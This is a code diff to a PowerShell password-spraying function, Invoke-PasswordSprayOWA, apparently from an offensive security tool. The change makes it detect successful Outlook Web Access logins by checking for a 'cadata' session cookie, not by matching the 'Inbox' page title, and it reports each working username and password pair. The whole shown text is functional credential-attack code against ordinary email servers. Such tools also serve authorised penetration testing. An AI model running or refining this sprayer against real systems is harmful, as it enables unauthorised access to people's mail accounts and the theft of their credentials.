@@ -1681,14 +1681,23 @@ function Invoke-PasswordSprayOWA{
         #Logging into Outlook Web Access    
         #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
-	$sess = ""
+	$cadatacookie = ""
+    	$sess = ""
 	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
 	$form = $owa.Forms[0]
 	$form.fields.password=$Password
 	$form.fields.username=$Username
         $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
         #Check title for inbox
-	if ($owalogin.ParsedHtml.title -match "Inbox*")
+        $cookies = $sess.Cookies.GetCookies($OWAURL2)
+        foreach ($cookie in $cookies)
+        {
+            if ($cookie.Name -eq "cadata")
+                {
+                $cadatacookie = $cookie.Value
+                }
+        }
+	if ($cadatacookie)
 	{
 		Write-Output "[*] SUCCESS! User:$username Password:$password"
 	}
@@ -1696,7 +1705,6 @@ function Invoke-PasswordSprayOWA{
 
     }
     } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
-
 }
 $Complete = Get-Date
 $MaxWaitAtEnd = 10000
